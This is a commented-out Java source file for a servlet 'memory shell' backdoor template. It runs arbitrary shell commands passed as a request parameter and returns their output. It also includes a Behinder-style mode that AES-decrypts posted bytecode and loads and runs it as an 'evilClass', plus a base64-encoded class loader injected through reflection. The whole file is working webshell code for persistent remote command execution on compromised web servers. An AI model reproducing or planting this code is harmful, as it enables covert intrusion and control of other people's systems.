//package com.memshell.generic;
//
//import sun.misc.BASE64Decoder;
//import javax.crypto.Cipher;
//import javax.crypto.spec.SecretKeySpec;
//import javax.servlet.ServletRequest;
//import javax.servlet.ServletResponse;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.io.File;
//import java.io.IOException;
//import java.lang.reflect.InvocationTargetException;
//import java.lang.reflect.Method;
//import java.util.Scanner;
//
//public class DynamicServletTemplate extends HttpServlet {
//
//    private Class myClassLoaderClazz;
//
//    public DynamicServletTemplate(){
//        super();
//        initialize();
//    }
//
//    @Override
//    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
//        System.out.println("[+] Dynamic Servlet says hello");
//
//        if(request.getParameter("type") != null && request.getParameter("type").equals("basic")){
//            //basic cmd shell
//            String cmd = request.getParameter(Config.getPassword());
//            if(cmd != null && !cmd.isEmpty()){
//                String[] cmds = null;
//                if(File.separator.equals("/")){
//                    cmds = new String[]{"/bin/sh", "-c", cmd};
//                }else{
//                    cmds = new String[]{"cmd", "/C", cmd};
//                }
//                String result = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\A").next();
//                response.getWriter().println(result);
//            }
//        }else if(request.getHeader(Config.getHeader()) != null){
//            //behind3 shell
//            try{
//                if (request.getMethod().equals("POST")){
//                    String k = Config.getBehinderShellPwdPwd();
//                    request.getSession().setAttribute("u",k);
//                    Cipher cipher = Cipher.getInstance("AES");
//                    cipher.init(2, new SecretKeySpec((request.getSession().getAttribute("u") + "").getBytes(), "AES"));
//                    byte[] evilClassBytes = cipher.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
//                    Class evilClass = (Class) myClassLoaderClazz.getDeclaredMethod("defineClass", byte[].class, ClassLoader.class).invoke(null, evilClassBytes, Thread.currentThread().getContextClassLoader());
//                    Object evilObject = evilClass.newInstance();
//                    Method targetMethod = evilClass.getDeclaredMethod("equals", new Class[]{ServletRequest.class, ServletResponse.class});
//                    targetMethod.invoke(evilObject, new Object[]{request, response});
//                }
//            }catch(Exception e){
//                e.printStackTrace();
//            }
//        }
//    }
//
//    @Override
//    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
//        doPost(request, response);
//    }
//
//    private void initialize(){
//        try{
//            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
//            try{
//                this.myClassLoaderClazz = classLoader.loadClass("com.memshell.generic.MyClassLoader");
//            } catch (ClassNotFoundException e) {
//                Class clazz = classLoader.getClass();
//                Method method = null;
//                while(method == null && clazz != Object.class){
//                    try{
//                        method = clazz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                    }catch(NoSuchMethodException ex){
//                        clazz = clazz.getSuperclass();
//                    }
//                }
//
//                String code = "yv66vgAAADIAGwoABQAWBwAXCgACABYKAAIAGAcAGQEABjxpbml0PgEAGihMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACRMY29tL21lbXNoZWxsL2dlbmVyaWMvTXlDbGFzc0xvYWRlcjsBAAFjAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAtkZWZpbmVDbGFzcwEALChbQkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7AQAFYnl0ZXMBAAJbQgEAC2NsYXNzTG9hZGVyAQAKU291cmNlRmlsZQEAEk15Q2xhc3NMb2FkZXIuamF2YQwABgAHAQAiY29tL21lbXNoZWxsL2dlbmVyaWMvTXlDbGFzc0xvYWRlcgwADwAaAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQACAAUAAAAAAAIAAAAGAAcAAQAIAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAJAAAABgABAAAABAAKAAAAFgACAAAABgALAAwAAAAAAAYADQAOAAEACQAPABAAAQAIAAAARAAEAAIAAAAQuwACWSu3AAMqAyq+tgAEsAAAAAIACQAAAAYAAQAAAAgACgAAABYAAgAAABAAEQASAAAAAAAQABMADgABAAEAFAAAAAIAFQ==";
//                byte[] bytes = new BASE64Decoder().decodeBuffer(code);
//                method.setAccessible(true);
//                this.myClassLoaderClazz = (Class) method.invoke(classLoader, bytes, 0, bytes.length);
//            }
//        } catch (IllegalAccessException e) {
//            e.printStackTrace();
//        } catch (IOException e) {
//            e.printStackTrace();
//        } catch (InvocationTargetException e) {
//            e.printStackTrace();
//        }
//    }
//}
